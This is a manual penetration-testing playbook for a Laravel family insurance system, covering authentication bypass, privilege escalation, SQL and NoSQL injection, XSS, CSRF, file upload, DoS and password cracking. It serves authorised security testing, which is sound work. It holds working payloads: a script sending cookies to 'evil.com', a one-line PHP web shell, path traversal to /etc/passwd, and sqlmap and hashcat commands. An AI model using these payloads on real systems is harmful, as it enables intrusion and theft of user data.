# Manual Penetration Testing Procedures
## Laravel Family Insurance System Security Assessment

### Overview
This document provides comprehensive manual penetration testing procedures for the Laravel family grouping insurance system. These procedures complement the automated security test suite and cover areas that require manual intervention or external tools.

---

## Pre-Testing Setup

### Environment Preparation
1. **Test Environment**: Ensure testing is performed on a dedicated test environment
2. **Database Backup**: Create full database backup before testing
3. **Logging Setup**: Enable detailed application logging
4. **Network Isolation**: Ensure test environment is isolated from production

### Required Tools
- **Burp Suite Professional** or **OWASP ZAP** (Web Application Scanner)
- **SQLmap** (SQL Injection Testing)
- **Hydra** or **Medusa** (Brute Force Testing)
- **Nmap** (Network Scanning)
- **Wireshark** (Network Traffic Analysis)
- **Browser Developer Tools**
- **Custom scripts** for specific attack scenarios

---

## 1. AUTHENTICATION BYPASS TESTING

### 1.1 SQL Injection in Login Form

**Objective**: Test for SQL injection vulnerabilities in customer authentication

**Procedure**:
```bash
# Manual SQL injection payloads in login form
Email: admin'--
Password: anything

Email: ' OR '1'='1
Password: ' OR '1'='1

Email: ' UNION SELECT 1,2,3,4,5,6,7,8 WHERE '1'='1
Password: anything

# Time-based blind SQL injection
Email: admin' AND (SELECT SLEEP(5))--
Password: anything
```

**Expected Result**: All attempts should fail with generic error message, no database errors exposed

**Risk Level**: Critical if successful

---

### 1.2 Authentication Bypass via Parameter Manipulation

**Procedure**:
1. Intercept login request using Burp Suite
2. Modify parameters:
   ```
   email[]=valid@email.com&email[]=admin@system.com
   password=validpassword
   
   email=valid@email.com&password[]=validpassword&password[]=admin
   
   remember=true&remember=false&email=valid@email.com
   ```
3. Test NULL byte injection:
   ```
   email=valid@email.com%00&password=validpassword
   ```

**Expected Result**: Authentication should fail, no bypass should occur

---

### 1.3 Session Fixation Testing

**Procedure**:
1. Start new browser session, note session cookie
2. Navigate to login page without logging in
3. Note session ID from cookie
4. Login with valid credentials
5. Check if session ID changed after authentication

**Expected Result**: Session ID should change after successful login

**Command**:
```bash
# Using curl to test session fixation
curl -c cookies.txt http://yourapp.com/customer/login
curl -b cookies.txt -d "email=test@test.com&password=password" http://yourapp.com/customer/login
# Compare session IDs before and after login
```

---

## 2. AUTHORIZATION ELEVATION ATTACKS

### 2.1 Horizontal Privilege Escalation

**Objective**: Test if family members can access other members' data without authorization

**Procedure**:
1. Login as regular family member
2. Attempt to access family head's policies:
   ```
   GET /customer/policies/{family_head_policy_id}
   GET /customer/policies/{family_head_policy_id}/download
   ```
3. Try parameter tampering:
   ```
   GET /customer/policies?customer_id={family_head_id}
   ```
4. Test IDOR (Insecure Direct Object References):
   ```
   # Sequential policy ID testing
   GET /customer/policies/1
   GET /customer/policies/2
   GET /customer/policies/3
   ...
   ```

**Expected Result**: 403 Forbidden for unauthorized access

---

### 2.2 Vertical Privilege Escalation

**Objective**: Test if regular family members can elevate to family head privileges

**Procedure**:
1. Login as regular family member
2. Intercept profile update requests
3. Add privilege escalation parameters:
   ```json
   {
     "name": "Regular Member",
     "is_head": true,
     "family_head_id": "{current_user_id}",
     "relationship": "head"
   }
   ```
4. Test role manipulation in cookies/session:
   ```
   role=family_head
   privileges=all_policies
   is_admin=true
   ```

**Expected Result**: Escalation should be prevented, audit logs should record attempts

---

## 3. SESSION HIJACKING & FIXATION

### 3.1 Session Token Analysis

**Procedure**:
1. **Randomness Testing**:
   ```bash
   # Collect multiple session tokens
   for i in {1..100}; do
     curl -c token$i.txt http://yourapp.com/customer/login
     grep session token$i.txt >> tokens.txt
   done
   # Analyze for patterns using statistical tools
   ```

2. **Session Token Entropy**:
   - Analyze token length, character set, predictability
   - Check for timestamp-based patterns
   - Verify cryptographic randomness

3. **Session Timeout Testing**:
   ```bash
   # Login and wait for timeout
   curl -c session.txt -d "email=test@test.com&password=password" http://yourapp.com/customer/login
   sleep 3700  # Wait beyond session timeout
   curl -b session.txt http://yourapp.com/customer/dashboard
   ```

---

### 3.2 Concurrent Session Handling

**Procedure**:
1. Login from Browser A
2. Login from Browser B with same credentials
3. Test if both sessions remain active
4. Perform sensitive actions from both sessions
5. Logout from one session, verify other session status

**Expected Result**: Concurrent sessions should be properly managed, sensitive actions should require re-authentication

---

## 4. SQL INJECTION TESTING

### 4.1 Advanced SQL Injection

**Procedure using SQLmap**:
```bash
# Test login form
sqlmap -u "http://yourapp.com/customer/login" --data="email=test&password=test" --method=POST --level=5 --risk=3

# Test policy detail page
sqlmap -u "http://yourapp.com/customer/policies/1" --cookie="session_cookie_here" --level=5 --risk=3

# Test with authentication
sqlmap -u "http://yourapp.com/customer/policies/1" --auth-type=Basic --auth-cred="email:password" --level=5

# Blind SQL injection with time delays
sqlmap -u "http://yourapp.com/customer/policies" --data="search=test" --technique=T --level=5
```

### 4.2 NoSQL Injection (if applicable)

**Procedure**:
```javascript
// Test MongoDB injection in search parameters
email[$ne]=invalid&password[$ne]=invalid
email[$regex]=.*&password[$regex]=.*
email[$where]=sleep(5000)&password=anything
```

---

## 5. CROSS-SITE SCRIPTING (XSS)

### 5.1 Stored XSS Testing

**Procedure**:
1. **Profile Fields Testing**:
   ```html
   <!-- Test in customer name field -->
   <script>alert('XSS')</script>
   <img src="x" onerror="alert('XSS')">
   <svg onload="alert('XSS')">
   "><script>document.location='http://evil.com/'+document.cookie</script>
   ```

2. **Policy Data Fields**:
   ```html
   <!-- Test in policy descriptions, notes -->
   javascript:alert('XSS')
   data:text/html,<script>alert('XSS')</script>
   <iframe src="javascript:alert('XSS')">
   ```

3. **Upload Fields** (if any):
   ```html
   <!-- Test in file names, descriptions -->
   filename"><script>alert('XSS')</script>.pdf
   ```

---

### 5.2 Reflected XSS Testing

**Procedure**:
```bash
# URL parameter testing
http://yourapp.com/customer/search?q=<script>alert('XSS')</script>
http://yourapp.com/customer/policies?filter="><img src=x onerror=alert('XSS')>

# Header injection
X-Forwarded-For: <script>alert('XSS')</script>
User-Agent: <script>alert('XSS')</script>
Referer: <script>alert('XSS')</script>
```

---

## 6. CSRF PROTECTION TESTING

### 6.1 CSRF Token Bypass

**Procedure**:
1. **Remove CSRF Token**:
   ```html
   <form action="/customer/change-password" method="POST">
     <!-- _token field removed -->
     <input name="current_password" value="oldpass">
     <input name="password" value="newpass">
     <input name="password_confirmation" value="newpass">
   </form>
   ```

2. **CSRF Token Reuse**:
   - Capture valid CSRF token
   - Use same token for multiple requests
   - Test token expiration

3. **CSRF via GET**:
   ```html
   <img src="http://yourapp.com/customer/logout">
   <iframe src="http://yourapp.com/customer/policies/1/download">
   ```

---

## 7. FILE UPLOAD SECURITY

### 7.1 Malicious File Upload

**Procedure**:
1. **PHP Shell Upload**:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   Save as: `shell.pdf.php`, `shell.jpg.php`

2. **Path Traversal in Upload**:
   ```
   filename: ../../etc/passwd
   filename: ../../../var/www/html/shell.php
   ```

3. **Content-Type Bypass**:
   - Upload PHP file with `Content-Type: image/jpeg`
   - Upload executable with `Content-Type: application/pdf`

---

## 8. INFORMATION DISCLOSURE

### 8.1 Error Message Analysis

**Procedure**:
1. **Database Error Disclosure**:
   ```bash
   # Trigger database errors
   http://yourapp.com/customer/policies/999999999
   http://yourapp.com/customer/policies/-1
   http://yourapp.com/customer/policies/'
   http://yourapp.com/customer/policies/abc
   ```

2. **Application Path Disclosure**:
   ```bash
   # Invalid function calls
   http://yourapp.com/customer/policies/debug
   http://yourapp.com/customer/nonexistent-page
   ```

3. **Stack Trace Information**:
   - Force application exceptions
   - Check for exposed file paths, database details

---

### 8.2 Sensitive Data Exposure

**Procedure**:
1. **Source Code Comments**:
   ```bash
   # Check HTML source for sensitive comments
   curl http://yourapp.com/customer/dashboard | grep -i "password\|key\|secret\|token"
   ```

2. **JavaScript Variable Exposure**:
   ```javascript
   // Check browser console for exposed variables
   console.log(window);
   // Look for API keys, tokens, user data
   ```

3. **HTTP Response Headers**:
   ```bash
   curl -I http://yourapp.com/customer/dashboard
   # Check for exposed server information, debug headers
   ```

---

## 9. BUSINESS LOGIC TESTING

### 9.1 Race Condition Testing

**Procedure**:
1. **Concurrent Policy Downloads**:
   ```bash
   # Multiple simultaneous downloads
   for i in {1..10}; do
     curl -b session.txt "http://yourapp.com/customer/policies/1/download" &
   done
   ```

2. **Account Modification Race**:
   - Simultaneously change password from multiple browsers
   - Concurrent family relationship changes

---

### 9.2 Workflow Bypass

**Procedure**:
1. **Step Skipping**:
   - Skip email verification step
   - Bypass password change requirement
   - Skip family verification

2. **State Manipulation**:
   ```bash
   # Manipulate customer status
   curl -X PUT -b session.txt -d "status=true" http://yourapp.com/customer/profile
   ```

---

## 10. RATE LIMITING & DOS

### 10.1 Rate Limiting Bypass

**Procedure**:
```bash
# IP spoofing attempts
for ip in 192.168.1.{1..254}; do
  curl -H "X-Forwarded-For: $ip" -d "email=test&password=wrong" http://yourapp.com/customer/login
done

# User-Agent rotation
for agent in "Chrome" "Firefox" "Safari" "Edge"; do
  curl -H "User-Agent: $agent" -d "email=test&password=wrong" http://yourapp.com/customer/login
done

# Distributed requests
burp-suite-intruder --threads=50 --payloads=ips.txt
```

---

### 10.2 Application-Level DoS

**Procedure**:
1. **Resource Exhaustion**:
   ```bash
   # Large policy searches
   curl -b session.txt "http://yourapp.com/customer/policies?search=*&limit=999999"
   
   # Complex database queries
   curl -b session.txt "http://yourapp.com/customer/policies?sort=name&order=asc&filter=all&page=999999"
   ```

2. **Memory Exhaustion**:
   - Upload large files (if applicable)
   - Request large datasets

---

## 11. CRYPTOGRAPHIC TESTING

### 11.1 Password Storage Analysis

**Procedure**:
1. **Hash Algorithm Identification**:
   ```sql
   -- Check password hashes in database
   SELECT password FROM customers LIMIT 5;
   -- Identify hash type (bcrypt, scrypt, etc.)
   ```

2. **Rainbow Table Attack**:
   ```bash
   # Test common passwords with hashcat
   hashcat -m 3200 -a 0 hashes.txt rockyou.txt
   ```

---

### 11.2 Session Token Cryptanalysis

**Procedure**:
1. **Token Pattern Analysis**:
   ```python
   import requests
   import statistics
   
   tokens = []
   for i in range(1000):
       r = requests.get('http://yourapp.com/customer/login')
       tokens.append(r.cookies.get('session'))
   
   # Analyze entropy, patterns
   ```

---

## 12. REPORTING AND DOCUMENTATION

### 12.1 Vulnerability Classification

**Severity Levels**:
- **Critical**: Authentication bypass, SQL injection with data access
- **High**: Privilege escalation, stored XSS, sensitive data exposure  
- **Medium**: CSRF, reflected XSS, information disclosure
- **Low**: Missing security headers, weak session management

### 12.2 Evidence Collection

**For Each Vulnerability**:
1. **Request/Response** samples
2. **Screenshots** of successful exploits
3. **Database** impact (if any)
4. **Steps to reproduce**
5. **Potential impact** assessment
6. **Remediation recommendations**

---

## 13. POST-TESTING PROCEDURES

### 13.1 System Cleanup
1. Remove any uploaded test files
2. Restore database from backup if needed
3. Clear test accounts and data
4. Reset rate limiting counters

### 13.2 Report Generation
1. Executive summary
2. Technical findings
3. Risk assessment matrix
4. Remediation roadmap
5. Retest requirements

---

## Emergency Procedures

### If Critical Vulnerability Found:
1. **Immediately** stop testing
2. Document the finding
3. Notify system administrators
4. Secure the test environment
5. Provide immediate remediation guidance

### If System Compromise Detected:
1. Isolate affected systems
2. Preserve evidence
3. Contact security team
4. Begin incident response procedures

---

## Notes and Best Practices

1. **Always** test in isolated environments
2. **Never** test on production systems
3. **Document** everything thoroughly
4. **Coordinate** with development team
5. **Follow** responsible disclosure practices
6. **Verify** fixes through retesting

---

*This document should be regularly updated to reflect new attack techniques and system changes.*